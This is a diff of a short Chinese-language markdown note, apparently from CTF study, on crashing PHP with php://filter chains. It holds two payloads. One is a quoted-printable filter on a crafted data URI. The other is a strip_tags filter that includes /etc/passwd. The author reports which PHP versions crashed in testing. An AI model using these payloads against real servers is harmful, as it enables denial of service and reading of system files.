@@ -1,21 +1,25 @@
 
 ## Segmentation fault
 参考文章
-	- https://hackmd.io/s/Hk-2nUb3Q
-	- https://www.jianshu.com/p/dfd049924258
+- https://hackmd.io/s/Hk-2nUb3Q
+- https://www.jianshu.com/p/dfd049924258
 
-1. 超大字符
+
+### 超大字符
 参考上面的文章可知下列语句可以触发fault，但是我在当时比赛过后测试也就是2018年测试(php7.2.10)的时候是可以的，但是我在19年5.14日测试发现php5.6，php(7.0.33,7.1.29,7.2.18,7.3,5)都不可以了。可能时修复了，但是如果安装了旧版本没有升级(小本版号码)的话，应该还是纯在的吧？
-```php
 
+```php
 file(urldecode('php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAFAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA'));
 ```
-2. strip_tags
-PHP=7.0.33
+
+### trip_tags
+
+同上，但是此时测试在版本PHP7.0.33成功复现
 ```
 <?php
 include("php://filter/string.strip_tags/resource=/etc/passwd");
 ?>
+
 ```
 
 
